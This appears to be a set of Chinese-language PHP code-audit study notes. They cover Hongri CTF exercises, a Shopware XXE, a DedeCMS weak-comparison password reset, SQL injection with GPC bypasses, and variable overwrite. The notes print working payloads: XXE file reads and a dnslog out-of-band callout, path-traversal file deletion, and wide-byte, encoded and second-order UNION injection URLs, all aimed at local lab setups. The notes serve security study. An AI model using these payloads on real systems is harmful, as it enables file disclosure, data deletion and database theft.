我们可以看到 **sort** 值为 `{"Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting":{"direction":"asc"}}` ,于是我们按照其格式构造payload： `{"SimpleXMLElement":{"data":"http://127.0.0.1:8081/xxe.xml","options":2,"data_is_url":1,"ns":"","is_prefix":0}}` ，关于payload的含义，可以看看 **SimpleXMLElement** 类的 **__construct** 函数定义，具体点 [这里](http://php.net/manual/zh/simplexmlelement.construct.php) 

```php
final public SimpleXMLElement::__construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = "" [, bool $is_prefix = FALSE ]]]] )
```

笔者所用的xxe.xml内容如下（dnslog外带测试）：

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://zf1yolo.9vqlm1.dnslog.cn">
    %file;
]>
```

<img src=".\图片\Snipaste_2023-04-05_17-25-03.png" alt="Snipaste_2023-04-05_17-25-03" style="zoom:67%;" />

#### 修复建议

关于PHP中XXE漏洞的修复，我们可以过滤关键词，如： **ENTITY** 、 **SYSTEM** 等，另外，我们还可以通过禁止加载XML实体对象的方式，来防止XXE漏洞（如下图第2行代码），具体代码如下：

<img src=".\图片\9.png" alt="9" style="zoom:80%;" />

### CTF收尾

#### 题目

```php
// index.php
<?php
class NotFound{
    function __construct()
    {
        die('404');
    }
}
spl_autoload_register(
	function ($class){
		new NotFound();
	}
);
$classname = isset($_GET['name']) ? $_GET['name'] : null;
$param = isset($_GET['param']) ? $_GET['param'] : null;
$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;
if(class_exists($classname)){
	$newclass = new $classname($param,$param2);
	var_dump($newclass);
    foreach ($newclass as $key=>$value)
        echo $key.'=>'.$value.'<br>';
}
```

```php
// f1agi3hEre.php
<?php
$flag = "HRCTF{X33_W1tH_S1mpl3Xml3l3m3nt}";
?>
```

#### 思路

我们把注意力放在class_exists()函数这里，上面我们说过了，这个函数它会去检查类是否定义，如果不存在的话，就会调用程序中的 **autoload** 函数。我们发现上面没有autoload 函数，是用**spl_autoload_register**注册了和__autoload()差不多的，这里输出404信息。 

我们仔细看上面的代码的几个`$_GET`，**我们发现这里的类和类里面的参数都是我们可以控制的**，满足了上面咱们提到的**实例化漏洞**。也就是说，我们可以调用PHP的内置类来完成我们的攻击。 先用 `GlobIterator` 类来寻找 flag 文件的名字，PHP手册对这个类的构造函数定义如下： 

<img src=".\图片\7000sss" alt="img" style="zoom: 80%;" />

 通过上图，我们知道，**第一个参数是必须的的，也就是搜索的文件名，第二个参数为选择文件的哪个信息作为键名**。咱们先搜一下.txt文件。我们构造payload如下：

```http
http://127.0.0.1:8081/security/hongri/day3/ctf/index.php?name=GlobIterator&param=*.php&param2=0
```

效果如下图，我们发现了 f1agi3hEre.php 的文件

<img src=".\图片\Snipaste_2023-04-05_17-43-43.png" alt="Snipaste_2023-04-05_17-43-43" style="zoom:80%;" />

下一步，就是查看这个文件,获取 flag。用到的内置类为 `SimpleXMLElement`，上面简单的提到了一下，现在就来使用它来进行XXE攻击来查看 f1agi3hEre.php 文件的内容。这里需要注意一点：要结合PHP流的使用，因为当文件中存在： < > & ' " 等符号时会导致XML解析错误。我们用PHP流进行base_64编码输出就可以了。 什么是PHP流呢？这里简单说一下，PHP提供了php://的协议允许访问PHP的输入输出流，标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器，主要提供如下访问方式来使用这些封装器：

```javascript
php://stdin
php://stdout
php://stderr
php://input
php://output
php://fd
php://memory
php://temp
php://filter
```

复制

咱们用的最多的是php://input、php://output、php://filter。这里咱们就用php://filter，**它是一个文件操作的协议**，可以对文件进行读写操作，具体看下表： 

<img src="https://ask.qcloudimg.com/http-save/yehe-5582822/yo1zsarvw8.png?imageView2/2/w/2560/h/7000" alt="img" style="zoom:50%;" />

 read参数值可为：

- string.strip_tags： 将数据流中的所有html标签清除
- string.toupper： 将数据流中的内容转换为大写
- string.tolower： 将数据流中的内容转换为小写
- convert.base64-encode： 将数据流中的内容转换为base64编码
- convert.base64-decode：解码 这样是不是清楚许多了呢？那就构造如下payload：

```html
http://127.0.0.1:8081/security/hongri/day3/ctf/index.php?name=SimpleXMLElement&param=<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=f1agi3hEre.php">]><x>%26xxe;</x>&param2=2
```

上面payload中的param2=2，实际上这里2对应的模式是 LIBXML_NOENT，具体效果如下图：

<img src=".\图片\Snipaste_2023-04-05_17-50-35.png" alt="Snipaste_2023-04-05_17-50-35" style="zoom:80%;" />

## day4

### CTF起手

[ 红日代码审计（day1-day14](https://blog.csdn.net/weixin_44897902/article/details/103833532)

题目叫做假胡子，代码如下：

<img src=".\图片\22121121.png" alt="22121121" style="zoom:80%;" />

**题目解析：**

我们看到 **第11行** 和 **第12行** ，程序通过格式化字符串的方式，使用 **xml** 结构存储用户的登录信息。实际上这样很容易造成**数据注入**。然后 **第21行** 实例化 **Login** 类，并在 **第16行** 处调用 **login** 方法进行登陆操作。在进行登录操作之前，代码在 **第8行** 和 **第9行** 使用 **strpos** 函数来防止输入的参数含有 **<** 和 **>** 符号，猜测开发者应该是考虑到非法字符注入问题。我们先来看一下 **strpos** 函数的定义：

> **[strpos](http://php.net/manual/zh/function.strpos.php)** — 查找字符串首次出现的位置
>
> 作用：主要是用来查找字符在字符串中首次出现的位置。
>
> 结构：`int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )`

<img src=".\图片\Snipaste_2023-04-05_18-21-02.png" alt="Snipaste_2023-04-05_18-21-02" style="zoom:80%;" />

在上面这个例子中，**strpos** 函数返回查找到的子字符串的下标。如果字符串开头就是我们要搜索的目标，则返回下标 0 ；如果搜索不到，则返回 false 。在这道题目中，开发者只考虑到 **strpos** 函数返回 **false** 的情况，却忽略了匹配到的字符在首位时会返回 **0** 的情况，因为 false 和 0 的取反均为 true 。这样我们就可以**在用户名和密码首字符注入 < 符号**，从而 **注入xml数据**。我们尝试使用以下 payload ，观察 strpos 函数的返回结果。

```
user=<"><injected-tag property="&pass=<injected-tag>
```

<img src=".\图片\2121121.png" alt="2121121" style="zoom:80%;" />

如上图所示，很明显是可以注入xml数据的。

```php
$format = '<?xml version="1.0"?>' .
                '<user v="%s"/><pass v="%s"/>';
```

根据以上拼接字符串，可以构造如下：

```
<?xml version="1.0">
<user v=""/><!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>< ""/>
<pass v=""/><description>&xxe;</description><""/>

所以payload如下
user:<>"/><!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>< "
pass:<>"/><description>&xxe;</description><"
```

构造后：

```php
$format = '<?xml version="1.0"?>' .
                '<user v="<>"/><!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>< ""/><pass v="<>"/><description>&xxe;</description><""/>';
```

### CMS实例

DeDecms V5.7SP2 正式版

#### 漏洞分析

该CMS存在未修复的**任意用户密码重置漏洞**。漏洞的触发点在 `member/resetpassword.php` 文件中，由于对接收的参数 `safeanswer` 没有进行严格的类型判断，导致可以使用弱类型比较绕过。我们来看看相关代码：

<img src=".\图片\6sss.png" alt="6sss" style="zoom:80%;" />

针对上面的代码做个分析，当 **$dopost** 等于 **safequestion** 的时候，通过传入的 **$mid** 对应的 **id** 值来查询对应用户的安全问题、安全答案、用户id、电子邮件等信息。跟进到 **第11行** ，当我们传入的问题和答案非空，而且等于之前设置的问题和答案，则进入 **sn** 函数。然而这里使用的是 **==** 而不是 **===** 来判断，所以是可以绕过的。假设用户没有设置安全问题和答案，那么默认情况下安全问题的值为 **0** ，答案的值为 **null** （这里是数据库中的值，即 **$row['safequestion']="0"** 、 **$row['safeanswer']=null** ）。当没有设置 **safequestion** 和 **safeanswer** 的值时，它们的值均为空字符串。第11行的if表达式也就变成了 **if('0' == '' && null == '')** ，即 **if(false && true)** ，所以我们只要让表达式 **$row['safequestion'] == $safequestion** 为 **true** 即可。下图是 **null == ''** 的判断结果：

<img src=".\图片\7s.png" alt="7s" style="zoom:80%;" />

我们可以利用 **php弱类型** 的特点，来绕过这里 **$row['safequestion'] == $safequestion** 的判断，如下：

<img src=".\图片\9sss.png" alt="9sss" style="zoom:80%;" />

通过测试找到了三个的payload，分别是 **0.0** 、 **0.** 、 **0e1** ，这三种类型payload均能使得 **$row['safequestion'] == $safequestion**  为 **true** ，即成功进入 **sn** 函数。sn 函数中则是要代码一步步跟进的，我就不跟了

## day6

### CTF起手

<img src=".\图片\1ssssss.png" alt="1ssssss" style="zoom:80%;" />

这一关考察的内容是由正则表达式不严谨导致的任意文件删除漏洞， 导致这一漏洞的原因在 **第19行** ， **preg_replace** 中的 **pattern** 部分 ，该正则表达式并未起到过滤目录路径字符的作用。`[^a-z.-_]`  表示匹配除了 **a** 字符到 **z** 字符、**.** 字符到 **_** 字符之间的所有字符。因此，攻击者还是可以使用点和斜杠符号进行路径穿越，最终删除任意文件，例如使用 **payload** ： `action = delete＆data = ../../ config.php`，便可删除 **config.php** 文件。

>[**preg_replace**](http://php.net/manual/zh/function.preg-replace.php)：(PHP 4, PHP 5, PHP 7)
>
>**功能** ： 函数执行一个正则表达式的搜索和替换
>
>**定义** ： `mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )`
>
>搜索 **subject** 中匹配 **pattern** 的部分， 如果匹配成功将其替换成 **replacement** 。

另外，`unlink()` 函数是经典的删除文件的函数

我改了一下代码，`unlink('D:/phpstudy/WWW/security/hongri/day6/' . $file);`   适用于本机windows环境，结果如下：

```http
http://127.0.0.1:8081/security/hongri/day6/demo.php?action=delete&data=../config.txt
```

### CTF收尾

```php
// index.php
<?php
include 'flag.php';
if  ("POST" == $_SERVER['REQUEST_METHOD'])
{
    $password = $_POST['password'];
    if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password))
    {
        echo 'Wrong Format';
        exit;
    }
    while (TRUE)
    {
        $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
        if (6 > preg_match_all($reg, $password, $arr))
            break;
        $c = 0;
        $ps = array('punct', 'digit', 'upper', 'lower');
        foreach ($ps as $pt)
        {
            if (preg_match("/[[:$pt:]]+/", $password))
            $c += 1;
        }
        if ($c < 3) break;
        if ("42" == $password) echo $flag;
        else echo 'Wrong password';
        exit;
    }
}
highlight_file(__FILE__);
?>
```

```php
// flag.php
<?php $flag = "HRCTF{Pr3g_R3plac3_1s_Int3r3sting}";?>
```



这道题目实际上考察的是大家是否熟悉PHP正则表达式的字符类，当然还涉及到一些弱类型比较问题。大家可以先查阅一下PHP手册对这些字符类的定义，具体可点 [这里](http://php.net/manual/zh/regexp.reference.character-classes.php) 。

| *alnum*  | 字母和数字                  |
| -------- | --------------------------- |
| *alpha*  | 字母                        |
| *ascii*  | 0 - 127的ascii字符          |
| *blank*  | 空格和水平制表符            |
| *cntrl*  | 控制字符                    |
| *digit*  | 十进制数(same as \d)        |
| *graph*  | 打印字符, 不包括空格        |
| *lower*  | 小写字母                    |
| *print*  | 打印字符,包含空格           |
| *punct*  | 打印字符, 不包括字母和数字  |
| *space*  | 空白字符 (比\s多垂直制表符) |
| *upper*  | 大写字母                    |
| *word*   | 单词字符(same as \w)        |
| *xdigit* | 十六进制数字                |

题目中总共有三处正则匹配，我们分别来看一下其对应的含义。第一处的正则 **/^[[:graph:]]{12,}$/** 为：匹配到可打印字符12个以上(包含12)，**^** 号表示必须以某类字符开头，**$** 号表示必须以某类字符结尾。第二处正则表达式：

```php
$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
if (6 > preg_match_all($reg, $password, $arr))
    break;
```

表示字符串中，把连续的符号、数字、大写、小写，作为一段，至少分六段，例如我们输入 **H0ng+Ri** 则匹配到的子串为 **H   0   ng   +   R   i** 。第三处的正则表达式：

```php
$ps = array('punct', 'digit', 'upper', 'lower');
foreach ($ps as $pt)
{
    if (preg_match("/[[:$pt:]]+/", $password))
    $c += 1;
}
if ($c < 3) break;
```

表示为输入的字符串至少含有符号、数字、大写、小写中的三种类型。然后题目最后将 **$password** 与42进行了弱比较。所以我们的payload为：

```php
password=42.00e+00000
password=420.00000e-1
```

网络上还有一种解法是： **password=\x34\x32\x2E** ，但是这种解法并不可行，大家可以思考一下为什么。

<img src=".\图片\12.png" alt="12" style="zoom:80%;" />

PS：在 [代码审计Day6 - 正则使用不当导致的路径穿越问题](https://xz.aliyun.com/t/2523) 的文章评论下面，我们提及了一个经典的通过正则写配置文件的案例，这个案例具体怎么绕过并写入shell，大家可以参考 [ **这里** ](https://github.com/wonderkun/CTF_web/tree/dcf36cb9ba9a580a4e8d92b43480b6575fed2c3a/web200-7) 。



# 审计基础知识

## SQL注入

在代码审计中，SQL注入是常见的WEB漏洞之一，在程序中需要用SQL查询的功能特别多，传递进来的参数不可控、或 者过滤不严很容易造成SQL注入漏洞。全文搜索 select update delete insert mysqli_query mysql_query 等关数据相关的 函数。

### GPC的作用

如果magic_quotes_gpc=On，PHP解析器就会自动为post、get、cookie过来的数据**增加转义字符“\”**，以确保这些数据 不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染 而出现致命的错误 。插入后在数据库里显示的是转义前的原始数据，所以取出来不用转义

在`magic_quotes_gpc=On`的情况下，如果输入的数据有 **单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）等字符**都会被加上**反斜线**。这些转义是必须的，如果这 个选项为off，那么我们就必须调用 `addslashes()` 这个函数来为字符串增加转义。

正是因为这个选项必须为On，但是又让用户进行配置的矛盾，在PHP6中删除了这个选项，一切的编程都需要在 `magic_quotes_gpc=Off`下进行了。在这样的环境下如果不对用户的数据进行转义，后果不仅仅是程序错误而已了。同样的会引起数据库被注入攻击的危险。所以从现在开始大家都不要再依赖这个设置为On了，以免有一天你 的服务器需要更新到PHP6而导致你的程序不能正常工作。

- 当 `magic_quotes_gpc=On` 的时候，函数 get_magic_quotes_gpc()  就会返回1 
- 当 `magic_quotes_gpc=Off` 的时候，函数 get_magic_quotes_gpc() 就会返回0

因此可以看出这个 `get_magic_quotes_gpc()` 函数的作用就是得到环境变量 magic_quotes_gpc 的值。既然在PHP6中删除 了magic_quotes_gpc这个选项，那么在PHP6中这个函数我想也已经不复存在了。

开启gpc：

打开`php.ini` 找到 `magic_quotes_gpc = Off` 设置成 On ，重启服务 即可开启

```php
<?php
var_dump(get_magic_quotes_gpc()); //查询gpc的值 1 是开启 0是关闭
```

在程序中通常是检测 gpc 是否开启，如果没有开启，使用 `addslashes()` 函数对传过来的字符进行过滤。

```php
<?php
//var_dump(get_magic_quotes_gpc()); //gpc 0 关闭 1 开启

function check_put($str)
{
    if (!get_magic_quotes_gpc()) { //判断gpc是否开启
        echo "GPC 未开启"."<br>";
        return addslashes($str); //没有开启 使用 addslashes 进行过滤
    }
    return $str;
}

echo check_put($_GET['id']);
```

<img src=".\图片\Snipaste_2023-04-08_15-34-52.png" alt="Snipaste_2023-04-08_15-34-52" style="zoom:80%;" />

### 绕过GPC

在php中，`addshalshes()` 函数的作用是在单引号(')、双引号(")、反斜杠()和NULL前加上反斜杠，这样可以绕过大部分的 恶意SQL注入。但是在某些情况下，该函数会失灵。

类似功能的函数：

```
addslashes，mysql_real_escape_string，mysql_escape_string
```

#### 1.SQL语句中传参无单引号闭合

**数字型参数**往往不需要用单引号(')闭合，比如`select productname from product where productID=1 and 1=1`，因为 SQL语句没有单引号，故攻击者只需在后面加上注入语句，`addslashes()` 函数对这些语句是不起作用的。 这种情况多见于**数字型注入**，解决的方法是先用 `intval()` 函数进行强制转换。

```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql0.php?id=1 union select 1,2,database()
```

<img src=".\图片\Snipaste_2023-04-08_15-58-05.png" alt="Snipaste_2023-04-08_15-58-05" style="zoom:80%;" />

#### 2.宽字节注入

如果 mysql 连接中有这样的语句 `mysql_query("SET NAMES 'gbk'")`，`set character_set_client=gbk` 就有可能存在宽字节注入，**该语句的作用是把传入的参数转换为GBK编码**。这时候如果这样注入：id=5'，就可以绕过addslashes()函数。 因为addslashes()函数首先在单引号(')前面加一个反斜杠()，这是id=5'，url编码为id=5'，在GBK编码中为中文“運”，这 就导致后面的单引号逃掉了。

```
%df%27===>(addslashes)====>%df%5c%27====>(GBK)====>運’
```



```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql5.php?id=%E9%81%8B%27%20union%20select%201,2,database()%23
```

<img src=".\图片\Snipaste_2023-04-08_16-22-15.png" alt="Snipaste_2023-04-08_16-22-15" style="zoom:80%;" />



```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql5.php?id=%df%27%20union%20select%201,2,user()%23
```

<img src=".\图片\Snipaste_2023-04-08_16-23-53.png" alt="Snipaste_2023-04-08_16-23-53" style="zoom:80%;" />



#### 3.敏感函数导致的宽字节注入

`iconv()`   `mb_convert_encodeing()`

```
$id = iconv('utf-8','gbk',$id)
$id = mb_convert_encoding('utf-8','gbk',$id)
如果存在这样的注入语句$id = admin' or 1=1--，那么就可以绕过addslashes注入。
原理和2相同
```

```
而如果反过来，也同样存在字节注入
$id = iconv('gbk',utf-8',$id)
$id = mb_convert_encoding('gbk','utf-8',$id)
只需要把注入语句改为$id = admin運' or 1=1--，原理同上
```



```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql6.php?id=%E9%81%8B%27%20union%20select%201,2,database()%23
```

<img src=".\图片\Snipaste_2023-04-08_16-36-38.png" alt="Snipaste_2023-04-08_16-36-38" style="zoom:80%;" />

#### 4.编码解码导致的URL绕过gpc

以下情况只与程序员写的特定后端代码有关，写得不规范则可能绕过。

##### urldecode 编码注入

`$id = urldecode($id) //注入语句进行两次编码`，首先通过 `addslashes()` 过滤，然后 `urldecode()` 解码

这个情况是浏览器解码一次，函数 `urldecode()` 解码一次，这个浏览器解码挺智能的，我们如下只把部分 `%23` 进行了url 二次编码成了 `%2527`，而没有二次url编码 `%20` ，仍然可以成功

```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql3.php?id=%2527%20union%20select%201,2,database()%23
```

<img src=".\图片\Snipaste_2023-04-08_16-47-21.png" alt="Snipaste_2023-04-08_16-47-21" style="zoom:80%;" />

```
$id = rawurldecode($id) 这个和上面效果一样
```

##### base64_decode 编码注入

`$id = base64_decode($id)`   //首先通过addslashes()过滤，然后urlencode解码

```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql7.php?id=LTEnIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSM=
```

<img src=".\图片\Snipaste_2023-04-08_16-59-10.png" alt="Snipaste_2023-04-08_16-59-10" style="zoom:80%;" />

##### json_encode 编码注入

`$id = json_encode($id)`  //该函数把转换为\，两个反斜杠抵消。

```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql4.php?id=-1%27%20union%20select%201,2,database()%23
```

<img src=".\图片\Snipaste_2023-04-08_17-08-29.png" alt="Snipaste_2023-04-08_17-08-29" style="zoom:80%;" />

### SQL注入弱类型

在判断数据类型时，php有类型函数 对其判断，php是一种弱类型，会自动转换类型。

如果只是判断，并没有赋值。可能会造成漏洞。

#### intval

整型转换函数

```php
echo intval(42); // 42
echo intval(4.2); // 4
echo intval('42'); // 42
echo intval('+42'); // 42
echo intval('-42'); // -42
echo intval(042); // 34
echo intval('042'); // 42
echo intval(1e10); // 1410065408
echo intval('1e10'); // 1
echo intval(0x1A); // 26
echo intval(42000000); // 42000000
echo intval(420000000000000000000); // 0
echo intval('420000000000000000000'); // 32位系统：2147483647 64位系统：9223372036854775807
echo intval(42, 8); // 42
echo intval('42', 8); // 34
echo intval(array()); // 0
echo intval(array('foo', 'bar')); // 1
```



测试，只要 id 中开头是数字，即可以进入 if 里。赋值后输出 id 则为开头的数字

```php
<?php

$id = $_GET['id'];
if(intval($id)){         //91991 union select 1,2,user()
    echo $sql ="select * from users id=".$id; //1 union select 1,2,user()
    echo "</br>";
}
//弱类型
$id=intval($id);            //91991 union select 1,2,user()
echo $id;        //91991
```

```http
http://127.0.0.1:8081/www.phpsec.com/test2.php?id=91991 union select 1,2,database()
```

<img src=".\图片\Snipaste_2023-04-08_17-53-36.png" alt="Snipaste_2023-04-08_17-53-36" style="zoom:80%;" />



再次实例测试

<img src=".\图片\Snipaste_2023-04-08_18-00-08.png" alt="Snipaste_2023-04-08_18-00-08" style="zoom:80%;" />

#### is_numeric

如果使用 `is_numeric()` 函数在 php7 以下的版本有bug ，用十六进制则都为 true，而同时 mysql 也可以使用十六进制进行crud

```php
<?php
var_dump(is_numeric($_GET['id']));
```

<img src=".\图片\Snipaste_2023-04-08_18-21-43.png" alt="Snipaste_2023-04-08_18-21-43" style="zoom:80%;" />

**接下来看一个例子：**

涉及知识点为php低版本 `is_numeric()` 函数的缺陷，和**二次注入**，代码如下：

```php
<?php
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
include '../config/db.php';
include '../function/function.php';

$id = isset($_GET['id'])?input($_GET['id']):1;
$title = input($_GET['title']);
//如果使用is_numeric 在php7以下的版本 有bug 在mysql中可以用十六进制查询

if($_GET['c']=='c'){

    if(!is_numeric($title)){  //使用 16进制 绕过这个 if
        die("不符合条件");
    }
    //插入用16进制编码的恶意数据，等会儿取出来查询时会触发二次注入
   echo  $sql="insert into news(title)values($title);";  //是 values($title) 不是values('$title')
    if ($result = $conn->query($sql)) {
        echo "success";
    }
}


$sql= "select * from news where id='$id'";
echo $sql;
echo "<br>";
if (!$result = $conn->query($sql)) {
    die(mysqli_error($conn));
}

while ($row = $result->fetch_assoc()) {
    echo "select * from news where title='$row[title]'"; // 以下把之前插入的恶意数据取出来进行二次注入
    if(!$result=$conn->query("select * from news where title='$row[title]'")){ //取引号再进行查询 就会造成SQL注入
        die(mysqli_error($conn));
    }
    $row2 = $result->fetch_assoc();
    var_dump($row2);
}
```

步骤一：用16进制插入恶意数据

<img src=".\图片\Snipaste_2023-04-08_18-43-12.png" alt="Snipaste_2023-04-08_18-43-12" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-04-08_18-44-38.png" alt="Snipaste_2023-04-08_18-44-38" style="zoom:80%;" />

发现第十六行恶意数据已经插入到 mysql：

<img src=".\图片\Snipaste_2023-04-08_18-45-21.png" alt="Snipaste_2023-04-08_18-45-21" style="zoom:80%;" />

步骤二：查询 id=16 的数据把 title 的数据拼接字符串显示到页面，形成二次注入

<img src=".\图片\Snipaste_2023-04-08_18-48-06.png" alt="Snipaste_2023-04-08_18-48-06" style="zoom:80%;" />

#### in_array

`in_array` 、`array_search` 如果第三个参数 没有设置成true ，会出现**弱类型漏洞** 

例如，只要**开头是数字且在数组内的内容即可绕过限制** ，例如 `1 union select 1,2,3` 即可绕过限制。

```php
<?php
$array1=[1,2,3,4];
$id = $_GET['id'];
var_dump(in_array($id,$array1));
```

<img src=".\图片\Snipaste_2023-04-08_19-06-48.png" alt="Snipaste_2023-04-08_19-06-48" style="zoom:67%;" />

例子：

<img src=".\图片\Snipaste_2023-04-08_19-09-36.png" alt="Snipaste_2023-04-08_19-09-36" style="zoom:80%;" />

#### swith

`swith` 也存在弱类型绕过 `1 union select 1,2,3--`

<img src=".\图片\Snipaste_2023-04-08_19-13-19.png" alt="Snipaste_2023-04-08_19-13-19" style="zoom:80%;" />



### 二次注入绕过GPC

与之前 `SQL注入弱类型.is_number` 里的知识点一样，注意GPC开启后转义的 `\'` 插入到数据库时会还原成 `'` ,例子如下：

```php
<?php
highlight_file(__FILE__);
header("Content-Type:text/html;charset=utf-8");
include '../config/db.php';
include '../function/function.php';

$id = isset($_GET['id'])?input($_GET['id']):1;
$title = input($_GET['title']);

if($_GET['c']=='c'){
   echo  $sql="insert into news(title)values('$title')"; //注入单引号会自动' 变成 \' 数据库就会存在单引号
    if ($result = $conn->query($sql)) {
        echo "success";
    }
}

$sql= "select * from news where id='$id'"; // 查询结果
echo $sql;
echo "<br>";
if (!$result = $conn->query($sql)) {
    die(mysqli_error($conn));
}

while ($row = $result->fetch_assoc()) {
    echo "select * from news where title='$row[title]'"; //把'取出来再查询 这样就会存在注入。
    if(!$result=$conn->query("select * from news where title='$row[title]'")){
        die(mysqli_error($conn));

    }
    $row2 = $result->fetch_assoc();
    var_dump($row2);
}
```



先插入恶意数据：

```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql12.php?c=c&title=1%27%20union%20select%201,2,user()--+
```

再取出查询

```http
http://127.0.0.1:8081/www.phpsec.com/sql/sql12.php?id=18
```

<img src=".\图片\Snipaste_2023-04-08_19-43-45.png" alt="Snipaste_2023-04-08_19-43-45" style="zoom:80%;" />

###  http头注入

通常，程序员会设置全局过滤防止SQL注入 开启之后 GET POST COOKIE这些传入过来的值都会进行过滤。

对 **http头**信息的值不但是直接获取，而且不会对其进行过滤。在php中获取头信息 是针对客户端的都是以HTTP头。 可以通过 `getenv()` 函数或者 `$_SERVER` 获取。

例如，获取ip 可以使用 `getenv('HTTP_X_FORWARDED_FOR') `或 `$_SERVER['HTTP_X_FORWARDED_FOR']`



危害函数：

```php
$_SERVER['HTTP_USER_AGENT'] //获取浏览器信息
$_SERVER['HTTP_X_FORWARDED_FOR']//获取客户端ip
$_SERVER['HTTP_CLIENT_IP']//获取客户端ip
$_SERVER['HTTP_REFERER']//获取来源
```

搜索这几个关键系统变量名 检测是否过滤，是否带入危险流程里：

```php
<?php
echo "<pre>";
var_dump($_SERVER['HTTP_USER_AGENT']);//获取客户端浏览器信息
var_dump($_SERVER['HTTP_X_FORWARDED_FOR']);//获取客户端ip
var_dump($_SERVER['HTTP_CLIENT_IP']); //获取客户端ip
var_dump($_SERVER['HTTP_REFERER']); //使用server获取来源值
var_dump(getenv('HTTP_X_FORWARDED_FOR')); //使用环境变量获取
echo "</pre>";
```

接下来伪造数据包，详情如下：

<img src=".\图片\Snipaste_2023-04-08_20-00-24.png" alt="Snipaste_2023-04-08_20-00-24" style="zoom:80%;" />



#### 实例测试，代码如下：

```php
<?php
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
include '../config/db.php';
include '../function/function.php';

$id = getip();  //自定义的关键函数 ，我们是从 请求头的 X-FORWARDED-FOR 里获取 ip
$sql= "select * from news where id='$id'"; // 查询结果
echo $sql;
echo "<br>";
if (!$result = $conn->query($sql)) {

    die(mysqli_error($conn));
}

while ($row = $result->fetch_assoc()) {
    echo "<pre>";
    var_dump($row);
    echo "</pre>";
}
```

```php
function getip(){
    if(getenv('HTTP_CLIENT_IP')){
    $onlineip = getenv('HTTP_CLIENT_IP');
}
elseif(getenv('HTTP_X_FORWARDED_FOR')){
    $onlineip = getenv('HTTP_X_FORWARDED_FOR');
}
elseif(getenv('REMOTE_ADDR')){
    $onlineip = getenv('REMOTE_ADDR');
}
else{
        $onlineip = $HTTP_SERVER_VARS['REMOTE_ADDR'];
    }
    return $onlineip;
}
```



接下来伪造数据包，如下注入成功

<img src=".\图片\Snipaste_2023-04-08_20-05-11.png" alt="Snipaste_2023-04-08_20-05-11" style="zoom:80%;" />



## 变量覆盖

变量覆盖就是**通过外部输入将某个变量的值给覆盖掉**。

将自定义的参数值替换掉原有变量值的情况就是变量覆盖漏洞。

变量未被初始化，输入的参数会自动给它赋值。

```
 $$
 extract()
 parse_str()
 import_request_variables()
 mb_parse_str
 register_globals全局变量覆盖。
 这个特性已经在PHP5.3.0中废弃，并在5.4.0版本移除。
```

例如 `register_globals` 全局变量覆盖 ，这个得在 php.ini 里配置，`register_globals =on`，且 php 版本得小于 5.4

```php
<?php
echo $_GET['name'];   // zfy
echo "<br>";
echo $name;           // zfy    $name即使未定义，但它就等于以上 $_GET['name'] 的值
```

### $$ 可可变量

可变变量，允许动态改变一个变量的值

```php
<?php

$str = "trans"; //声明变量str 的值为 trans
$trans = "moon"; //声明 变量$trans是moon ，trans也是变量$str的值 可以使用$$str表示
echo $str;       // trans
echo "<br>";
echo $trans;     // moon
echo "<br>";
echo $$str;      // moon
```

### extract

用法：`extract(array,extract_rules,prefix)`

| 参数            | 描述                                                         |
| :-------------- | :----------------------------------------------------------- |
| *array*         | 必需。规定要使用的数组。                                     |
| *extract_rules* | 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。可能的值：EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。EXTR_SKIP - 如果有冲突，不覆盖已有的变量。EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 *prefix*。EXTR_PREFIX_ALL - 给所有变量名加上前缀 *prefix*。EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 *prefix*。EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。 |
| *prefix*        | 可选。请注意 *prefix* 仅在 *extract_type* 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。 |

用法示例：

```php
<?php
$a = "Original";
$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
extract($my_array);
echo "\$a = $a; \$b = $b; \$c = $c";  // $a = Cat; $b = Dog; $c = Horse
?>
```

覆盖GET示例：

```php
<?php
$name="moonsec";
$shcool="fuckccp";
echo "</br>";
